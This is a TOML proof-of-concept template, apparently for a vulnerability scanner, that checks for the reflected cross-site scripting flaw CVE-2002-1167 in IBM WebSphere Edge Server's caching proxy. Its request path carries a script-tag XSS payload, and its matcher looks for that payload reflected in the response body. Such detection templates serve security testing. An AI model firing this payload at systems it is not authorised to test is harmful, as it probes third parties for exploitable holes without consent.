[info]
author = "AVE"
description = "检测 IBM WebSphere Edge Server 缓存代理是否存在跨站脚本漏洞，通过向代理服务器发送包含恶意脚本的 HTTP GET 请求，验证响应中是否反射了注入的脚本代码"
id = "POC-AVE-2002-0547"
name = "CVE-2002-1167 PoC"
severity = "medium"
tags = ["cve-2002-1167"]
vuln_id = [
    "CVE-2002-1167",
    "AVE-2002-0547",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/<script>alert('XSS')</script>"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS')</script>"]
